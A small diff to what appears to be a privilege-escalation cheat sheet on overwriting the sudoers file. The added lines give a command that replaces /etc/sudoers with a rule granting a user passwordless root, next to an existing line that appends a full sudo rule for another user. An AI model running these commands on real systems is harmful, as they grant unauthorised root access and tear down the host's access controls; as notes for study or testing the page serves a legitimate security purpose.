@@ -6,6 +6,14 @@ We can overwrite the sudoers file, if we have root rights in a way. In order to 
 
 ## Syntax
 
+#### Unauthenticated
+
+```
+echo user ALL=(ALL:ALL) NOPASSWD: ALL > /etc/sudoers
+```
+
+#### Authenticated
+
 ```
 echo saitama ALL=(ALL:ALL) ALL >> /etc/sudoers
 ```
